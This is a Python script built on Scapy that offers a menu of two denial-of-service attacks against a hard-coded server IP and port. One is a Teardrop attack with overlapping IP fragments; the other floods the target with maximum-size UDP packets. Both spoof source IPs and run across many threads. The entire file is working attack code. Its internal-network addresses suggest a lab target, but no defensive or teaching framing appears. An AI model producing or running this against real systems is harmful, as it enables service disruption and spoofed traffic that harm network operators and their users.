from scapy.all import *
import random
import threading
import time
from tqdm import tqdm

# Global variables for tracking sent packets and time
sent_packets = 0
start_time = 0

# Locks for thread-safe access to shared variables
sent_packets_lock = threading.Lock()

# Function representing the task to be performed in each thread
def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
    global sent_packets, start_time
    while sent_packets < count:
        # Choose a random source IP address
        source_ip = random.choice(source_ips)

        # Create a UDP packet with a randomized source IP and maximum payload size (1472 bytes)
        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / Raw(RandString(size=1472))

        # Send the packet silently (without printing sent packets message)
        send(udp_packet, verbose=0)

        # Increment sent_packets in a thread-safe manner
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1)  # Update every second


def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        # Create overlapping fragments for Tear Drop attack
        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))

        send(frag1, verbose=0)
        send(frag2, verbose=0)

        with sent_packets_lock:
            sent_packets += 1

        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1) 
        
# Main function
def main():
    global start_time
    attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
    number_of_packets = int(input("Enter the number of times to execute the attack: "))

    # Server IP and port (replace with actual values)
    server_ip = '192.168.119.130'
    server_port = 12345

    # List of source IP addresses to use (replace with actual IPs)
    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

    start_time = time.time()  # Record the start time

    # Create a tqdm progress bar
    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
        threads = []
        # Create threads and start the attack
        if attack_number == 1:
            for _ in range(number_of_packets):
                thread = threading.Thread(target=send_tear_drop_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
        
        elif attack_number == 2:
            for _ in range(number_of_packets):
                thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                threads.append(thread)
                thread.start()

            # Wait for all threads to complete
            for thread in threads:
                thread.join()

if __name__ == "__main__":
    main()
